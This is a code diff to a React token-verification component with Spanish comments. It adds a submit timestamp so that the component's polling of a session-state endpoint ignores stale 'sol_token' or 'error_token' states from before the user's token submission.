@@ -34,6 +34,7 @@ const TokenVerification = () => {
   const lastEstadoRef = useRef(null);
   const modalBloqueoEstadoRef = useRef(null);
   const ignorarEstadoHastaCambioRef = useRef(null);
+  const submitTickRef = useRef(0);
 
   // Bandera para evitar que el blur automático active el error
   const isAutoFocusing = useRef(false);
@@ -333,7 +334,8 @@ const TokenVerification = () => {
       // Se activa el estado de verificacion y loading
       setIsVerifying(true);
       setLoading(true);
-      lastEstadoRef.current = null;
+      submitTickRef.current = Date.now();
+      lastEstadoRef.current = "pendiente";
       modalBloqueoEstadoRef.current = null;
       ignorarEstadoHastaCambioRef.current = null;
 
@@ -411,8 +413,22 @@ const TokenVerification = () => {
         // Se realiza la petición al backend
         const response = await instanceBackend.post(`/bogota/verify-state/${sessionIdRef.current}`);
 
-        // Se captura el estado actual
+        // Se captura el estado actual y statusTick
         const estadoActual = (response?.data?.estado || "").toLowerCase();
+        const statusTick = response?.data?.statusTick ?? null;
+
+        // Si se envió Token, ignorar cualquier estado residual previo al submit y mantener loading
+        if (submitTickRef.current > 0) {
+          if (statusTick != null && Number(statusTick) < submitTickRef.current) {
+            pollingIntervalRef.current = setTimeout(poll, 2500);
+            return;
+          }
+          if ((estadoActual === "sol_token" || estadoActual === "error_token") && (statusTick == null || Number(statusTick) <= submitTickRef.current)) {
+            setLoading(true);
+            pollingIntervalRef.current = setTimeout(poll, 2500);
+            return;
+          }
+        }
 
         // Se valida si el estado actual no cambio o no es valido
         if (!estadoActual) {
@@ -462,6 +478,7 @@ const TokenVerification = () => {
         // Se ejecuta el switch del estado actual
         switch (estadoActual) {
           case "sol_token":
+            submitTickRef.current = 0;
 
             // Se desactiva el estado de verificacion y loading
             setIsVerifying(false);
